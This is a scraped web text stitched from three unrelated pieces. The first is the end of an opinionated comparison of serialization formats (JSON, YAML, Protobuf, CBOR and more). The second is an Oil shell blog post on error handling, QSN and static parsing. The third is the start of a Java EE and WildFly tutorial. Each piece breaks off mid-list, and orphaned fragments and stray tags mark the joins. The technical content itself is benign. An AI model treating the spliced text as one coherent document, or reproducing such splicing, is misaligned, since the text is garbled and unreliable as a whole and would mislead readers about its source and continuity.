<p><strong>Category:</strong> Human-readable, self-describing. (<a href="https://json-schema.org/">https://json-schema.org/</a> exists but does not seem very widely used.) Has an <a href="https://en.wikipedia.org/wiki/JSON-RPC">RPC protocol</a> but it also seems lightly used, <a href="https://jsonapi.org/">this</a> might be more general.</p>
<p><strong>Users:</strong> Everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Similar to major programming languages – Easy to understand and debug</li>
<li>Simple – Easy to read, write, and understand… at least for simple things. <a href="http://seriot.ch/parsing_json.php">Turns out there’s a lot of gotcha’s though.</a></li>
<li>Pretty compact if minified</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is pretty shit – no date/time, no real integers, no real structs, no unions/tuples/etc</li>
<li>Tends to discourage schema’s – “So simple it doesn’t need it”, until it becomes less simple.</li>
<li>No normalized form – fields may be reordered, <em>duplicated</em>, etc. Makes hashing it hard, gotta read whole message to begin verifying it, etc.</li>
<li>No comments – harder to write well than you might think!</li>
<li>No good way to contain binary data</li>
</ul>
<h2 id="yaml">YAML</h2>
<p><a href="https://yaml.org/">https://yaml.org/</a></p>
<p>Started out as a simpler alternative to XML.</p>
<p><strong>Category:</strong> Human-readable, self-describing.</p>
<p><strong>Users:</strong> Lots of people</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Vaguely simple to read and write, in its basic form</li>
<li>Low visual noise</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Way too complicated – they made it a strict superset of JSON for some damn reason, and nobody uses that form, so it’s just a pile of wasted effort</li>
<li>Reference impl incomplete, other impl’s disagree with each other and the spec</li>
</ul>
<h2 id="xml">XML</h2>
<p><a href="https://en.wikipedia.org/wiki/XML">https://en.wikipedia.org/wiki/XML</a></p>
<p>Not sure anyone really knows how XML happened. It’s basically the W3C’s fault, I think? It’s okay for some things but in the end I’m not sure it’s something anyone actually <em>wants</em> to use, it’s just going to be one more of those mistakes of the past.</p>
<p><strong>Category:</strong> Human-readable, self-describing with common schema usage. Has an <a href="https://en.wikipedia.org/wiki/XML-RPC">RPC protocol</a> and many other complicated things.</p>
<p><strong>Users:</strong> Everyone who can’t avoid it.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Promotes schemas and validation</li>
<li>Simple to use for simple things</li>
<li>Actually pretty decent for documents</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>I’ve never gotten schemas and validation to actually work in practice</li>
<li>Everything is string-ly typed</li>
<li>No real arrays</li>
<li>Complicated as frig</li>
<li>Very verbose</li>
<li>There’s like 3-4 different ways to do everything</li>
<li>Still no good way to contain binary data</li>
</ul>

<h2 id="protobuf">Protobuf</h2>
<p><a href="https://developers.google.com/protocol-buffers/">https://developers.google.com/protocol-buffers/</a></p>
<p>aka Protocol Buffers, but that’s a pretty dumb name. Google’s common, fast on-the-wire serialization format.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Has an <a href="https://grpc.io/">RPC protocol</a> built around it.</p>
<p><strong>Users:</strong> Google, basically everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Basically reasonable</li>
<li>Now has some support for versioning schemas, though it’s a hard problem in general</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Not particularly simple</li>
<li>Wire protocol may be more work than it needs to be</li>
<li>Its type system <a href="http://reasonablypolymorphic.com/blog/protos-are-wrong/index.html">could maybe be better</a></li>
</ul>
<h2 id="capn-proto">Cap’n Proto</h2>
<p><a href="https://capnproto.org/">https://capnproto.org/</a></p>
<p>The Other Binary Serialization Protocol.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC, which is built in to the reference implementation.</p>
<p><strong>Users:</strong> sandstorm.io, Cloudflare?, various other people but it doesn’t seem like that many</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed to be fast</li>
<li>Made by one of the people who worked heavily on Protobuf at Google, so <a href="https://capnproto.org/faq.html#how-do-i-make-a-field-required-like-in-protocol-buffers">there’s lots of experience behind it</a>. That said, doesn’t mean this cat’s always <em>right</em>, but there’s certainly opinions that are trying to be expressed.</li>
<li>Sophisticated RPC comes as part of the standard package</li>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
<li>Adorable name</li>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
<li>Lots of the docs and concepts are pretty low level, you usually ain’t gonna need it</li>
<li>Seems more complicated than protobuf – this might be one reason there’s fewer 3rd-party implementations</li>
</ul>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/">https://thrift.apache.org/</a></p>
<p>Apache’s version of Protobuf. Does anyone actually use this? Facebook, apparently, since they invented it and then gave it to Apache. Anyone else?</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC.</p>
<p><strong>Users:</strong> Basically mostly Facebook? Twitter and AirBNB also apparently use it, so apparently it’s not UNpopular.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>It works?</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Docs suck</li>
<li>Apache is the tragic junkyard of open source projects</li>
<li>Apparently still not as good as flatbuffers, see below</li>
</ul>
<h2 id="flatbuffers">Flatbuffers</h2>
<p><a href="https://google.github.io/flatbuffers/">https://google.github.io/flatbuffers/</a></p>
<p>Feels a little like Google’s answer to Cap’n Proto, as it has some of the same design goals – zero-copy serialization and layouts that are more amenable to versioning.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Includes RPC protocol.</p>
<p><strong>Users:</strong> Google, Cocos2D, Facebook’s mobile client</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda feels like the problem is already solved by capnp</li>
<li>Includes a JSON parser for some reason?</li>
<li>Type system is kinda anemic with regards to unions</li>
</ul>
<h2 id="cbor">CBOR</h2>
<p><a href="https://cbor.io/">https://cbor.io/</a></p>
<p>Basically a binary re-imagining of JSON.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> ???</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Pretty good type system – there’s things like fixnum’s, datetime’s, blobs, etc</li>
<li>Compact</li>
<li>Built-in extensibility</li>
<li>Designed to be a drop-in replacement for JSON</li>
<li>IETF standard</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda more complicated than it needs to be, though this is for the sake of compactness and comprehensive types. Numbers are densely packed into fewer bits when possible, for example.</li>
<li>Doesn’t actually seem that widely adopted for some reason?</li>
</ul>
<h2 id="msgpack">Msgpack</h2>
<p><a href="https://msgpack.org/">https://msgpack.org/</a></p>
<p>The Other CBOR, or rather, <a href="https://news.ycombinator.com/item?id=14067747">CBOR is derived from this</a>. Designed to be simple and compact. Kinda a <em>lot</em> like a slightly chopped down CBOR, actually, their integer specification stuff looks nearly identical.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> Redis, a few others?</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple</li>
<li>Compact</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Specification is kinda weak</li>
<li>No real tuple or enum types</li>
<li>Why not just CBOR?</li>
</ul>
<h2 id="bson">BSON</h2>
<p><a href="http://bsonspec.org/">http://bsonspec.org/</a></p>
<p>As the name implies, a binary-ifcation of JSON. Created by MongoDB as its internal data format.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> MongoDB</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Type system is full of deprecated and MongoDB-specific shit but is reasonably pragmatic</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is reasonably pragmatic but is full of deprecated and MongoDB-specific shit</li>
<li><strong>C strings</strong> – though there’s random non-C strings in places as well.</li>
<li>Its arrays are a travesty against serializarion</li>
<li>Basically an implementation detail of MongoDB, and it looks like it</li>
</ul>

<p>Things that are interesting but not actually in the scope of serialization languages, or are otherwise irrelevant.</p>
<h2 id="toml">TOML</h2>
<p><a href="https://github.com/toml-lang/toml">https://github.com/toml-lang/toml</a></p>
<p>Invalid, it’s designed as a config language, not a serialization format. It’s basically an attempt to make something as simple and ubiquitous as windows .INI files that is an actual specification rather than a fashion.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> Various, notably Cargo (Rust’s build tool)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Work well as a config language without deeply nested structures</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Works poorly when you try to make deeply nested structures</li>
</ul>
<h2 id="ron">RON</h2>
<p><a href="https://github.com/ron-rs/ron">https://github.com/ron-rs/ron</a></p>
<p>Rusty Object Notation. Because shoehorning Rust’s ML-y type systeminto JSON isn’t very much fun. Works startlingly well for this purpose but is basically untried elsewhere.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> A few, notably <a href="https://amethyst.rs/">Amethyst</a>.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Good type system for sophisticated functional-style languages</li>
<li>Simple and reasonably compact</li>
<li>Actually very good at what it does</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Young, underspecified, Rust-centric</li>
</ul>
<h2 id="bincode">Bincode</h2>
<p><a href="https://github.com/servo/bincode">https://github.com/servo/bincode</a></p>
<p>Included mainly for completeness. It’s not standardized outside of a single particular implementation which doesn’t promise stability, so not intended for general-purpose use. It’s intended as a fast and easy RPC/IPC format for Servo, and the actual format is basically an implementation detail of that goal.</p>
<p><strong>Users:</strong> Servo, programs written by introverts who don’t care about being able to talk to each other. (Turns out this is a useful niche though, who knew.)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Compact, fast, simple.</li>
<li>Works basically transparently for IPC with Rust code.</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Anything other than that specific version of that specific library is …</li></ul></div></div>

  2020-10-22
</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>

<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>

</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me
know</a> what you think is missing.</p>

though I still need to update it for 2021.</p>
<p>I then proposed a focus on making the OSH language "production ready".  I'm
still going to work on the Oil language, but I need help finishing it.</p>

<p>The two most popular Java frameworks for server-side application development are <strong>Java EE</strong> (<em>Enterprise Edition</em>) and <strong>Spring</strong>.
Java EE is the <em>official</em> specification,
whereas Spring (unofficially) describes pretty much the same functionality,
but in many cases does so in a slightly different, often easier way.</p>
<p>(Later on, we'll go into greater detail about what the Java EE specification <em>is</em>, and what the term actually means.)</p>
<p>Should you use Java EE for your next projects, then? No, probably not.
Because what's important to know about Java EE, is that it's a comparatively heavy framework,
in terms of both setup and actually running it (in production).
The Java EE framework has greatly improved over the last decade,
but in terms of documentation, ease-of-use and operational simplicity,
it still doesn't match up against <a href="https://spring.io/projects/spring-boot">Spring Boot</a>.</p>
<p>Becoming knowledgeable in Java EE can still be worthwile, though.
For example, if you're looking to expand your software consultancy services to enterprise clients.
The <em>EE</em> part of Java EE (Enterprise Edition) is still very fitting,
as the framework is still almost exclusively used by the enterprises and BigCo's like
banks, insurance companies, government agencies, S&amp;P500, AEX, etc.</p>
<p>After a general introduction, as well as an overview of the framework's terminology,
we'll be setting up a Java EE project from scratch,
the full source code of which can be found on <a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.

<p>Java EE is a Java framework for developing server-side applications.
Among other things, it allows you to:</p>
<ul>
<li>create web APIs by accepting incoming HTTP requests</li>
<li>save and retrieve data from databases</li>
<li>send and receive messages from message brokers</li>
<li>connect to other backend systems via HTTP or SOAP</li>
<li>package applications into single units of deployment (.war files)</li>
</ul>
<p>The framework is very much geared towards enterprises and big corporations.
As such, it often ends up being popular in the domains of banking, insurance, accounting, finance, and manufacturing.</p>
<p>Like the programming language Java itself, Java EE used to be owned and managed by
<a href="https://en.wikipedia.org/wiki/Oracle_Corporation">Oracle</a>.
However, between 2017 and 2019, Oracle has transfered the ownership of the Java EE framework to the
<a href="https://en.wikipedia.org/wiki/Eclipse_Foundation">Eclipse Foundation</a>,
resulting in the framework being renamed <em>Jakarta EE</em> from version 8-9 onward.</p>

<p>It's going to take time for the term Jakarta EE to really catch on,
as the term Java EE is still very much ingrained in the corporate software industry.</p>
<p>We will be setting up a <strong>Java EE 8</strong> application in the build-along section of this article.</p>
<a href="#specifications-and-apis"><h2 id="specifications-and-apis">Specifications and APIs</h2></a>
<p>You should think of Java EE as a collection of <em>recipes</em>.
Recipes for typical pieces of functionality within a server application.
The technical term for a Java EE recipe is a <em>Java Specification Request</em> (JSR),
and each JSR describes a single unit of functionality within the Java EE framework.
For example:</p>
<ul>
<li>Creating a RESTful web API? <strong>JSR 370</strong></li>
<li>Validating incoming HTTP request bodies? <strong>JSR 380</strong></li>
<li>Connecting and reading (or writing) from a database? <strong>JSR 338</strong></li>
<li>Publishing messages to a message broker? <strong>JSR 343</strong></li>
</ul>
<p>This modular setup lets developers pick and choose which parts of the framework they want to use.</p>
<p>In an actual project, this typically means that your application has a single Maven dependency on the
<a href="https://mvnrepository.com/artifact/javax/javaee-api">full Java EE API</a>.</p>
<p>And what's interesting to understand, is that these Java EE API modules consist of nothing but interfaces, annotations and simple POJOs.
<em>There is no actual Java EE framework functionality in <strong>any</strong> of these API modules.</em>
The <em>real</em> implementation of the Java EE specifications, interfaces and annotations lies with the host environment
in which your Java application(s) will be running.
And such host environments are referred to as <strong>Java EE application servers</strong>, or simply <strong>(application) servers</strong>.</p>
<a href="#application-servers-and-implementations"><h2 id="application-servers-and-implementations">Application Servers and Implementations</h2></a>
<p>Java EE applications can't stand on their own—they require a <em>Java EE application server</em> to run in,
because the server provides the application with the facilities it needs to carry out its tasks.</p>
<p>This ties back to the story about JSRs (Java Specification Requests) from earlier.
Since your application only depends on Java EE <strong>API</strong> modules,
it's agnostic of the actual implementation of these modules (at least in theory 😅).
It's up to the application server to provide the actual (runtime) <strong>implementations</strong> to these API modules.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/application-server.svg" alt="application server diagram with multiple deployments and multiple runtime implementation JAR files"></p>
<p>The image above should make clear that Java EE application servers are to be thought of as facilitating environments,
in which multiple (unrelated) Java apps from different teams or departments
can simaltuneously run alongside each other, each application pseudo-isolated from its neighbours.</p>
<p>An application server doesn't have to implement every single Java EE specification, though.
Different servers can have varying degrees of specification <em>compliance</em>.</p>
<p>For example, the <a href="http://tomcat.apache.org/">Apache Tomcat</a> server only implements the web layer of the
Java EE specification and, as such, is referred to as a <strong>web server</strong>.
The <a href="https://www.wildfly.org/">JBoss WildFly</a> server, on the other hand,
implements every part of the Java EE specification, and can therefore be referred to as a <strong>(Full) Java EE application server</strong>.</p>
<p>Below's an overview of the most popular Java EE servers.</p>

<p>When deploying a Java EE application to some server, there will be lots of additional libraries available on the classpath at runtime.
These are all <em>implementation libraries</em> for the different Java EE API modules which the application might depend on.
So there's a big difference between <em>compile-time</em> API libraries and <em>runtime</em> implementation libraries.</p>
<hr>
<p>For example, by having a Maven <em>compile</em> dependency on the (full) <a href="https://mvnrepository.com/artifact/javax/javaee-api">Java EE API</a> library,
you'll be able to decorate your classes and methods with the <code>@Path</code> and <code>@GET</code> annotations (part of JSR 370)
and create a simple HTTP endpoint like this:</p>
<pre><code><span>@Path</span><span>(</span><span>"/ping"</span><span>)</span>
<span>public</span> <span>class</span> <span>PingResource</span> <span>{</span>

    <span>@GET</span>
    <span>public</span> <span>Response</span> <span>ping</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>Response</span><span>.</span><span>ok</span><span>(</span><span>"Ping"</span><span>)</span><span>.</span><span>build</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

<span>}</span></code></pre>
<p>In and of themselves, Java runtime annotations don't do anything.
That's why the application server has an <em>implementation library</em> for JSR 370, which it places on the classpath during runtime.
This implementation would then have a built-in mechanism which scans your application for all classes with the <code>@Path</code> annotation,
and register them as HTTP endpoints.</p>
<hr>
<p>Server developers typically choose to implement most of the <a href="https://jcp.org/en/jsr/all">500+</a> JSRs themselves.
Often, these implementation are then packaged into standalone libraries so that, in theory,
they can be re-used by other server developers.</p>
<p>As such, there are typically only 1 or 2 popular implementation libraries for each specification,
which may or may not find their way into the standard configuration of multiple different application servers over time.</p>

<a href="#jboss-wildfly"><h2 id="jboss-wildfly">JBoss WildFly</h2></a>
<p>JBoss used to be the name of a company which has developed one of the most popular Java EE application servers in the world:
<a href="https://www.redhat.com/en/technologies/jboss-middleware/application-platform">JBoss EAP</a> (Enterprise Application Platform).
The other application server which JBoss is known for, is called <a href="https://www.wildfly.org/">WildFly</a>.
The difference? Technically, nothing.
WildFly is the free community edition
and JBoss EAP is the paid enterprise edition (with official support)
of the <em>same</em> application server.</p>
<p>As a sidenote, JBoss actually got acquired by <a href="https://www.redhat.com/">RedHat</a> in 2006.
And then, in 2019, RedHat got acquired by <a href="https://www.ibm.com/">IBM</a>.
So the JBoss EAP / WildFly server is technically part of IBM's portfolio now,
together with IBM's self-developed Java EE application server called <a href="https://www.ibm.com/cloud/websphere-application-platform/">WebSphere</a>.</p>
<p>We'll be working with the <strong>JBoss WildFly</strong> application server (version <strong>20</strong>) in the build-along section of this article.</p>
<a href="#project-overview"></a>
<p>We'll be working on a Java EE application with the following features:</p>
<ul>
<li>customers can sign up via the <code>POST /accounts</code> endpoint<ul>
<li>their <code>name</code> and <code>email</code> are saved into the database</li>
<li>they're sent a welcome e-mail</li>

<p>You can find the full source code of the final application on
<a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.
If you would like to follow along, please make sure to have the following tools installed:</p>
<ul>
<li><strong>Java 11</strong> - newer language versions aren't supported by the WildFly version we're going to pick later</li>
<li><strong>Maven</strong></li>
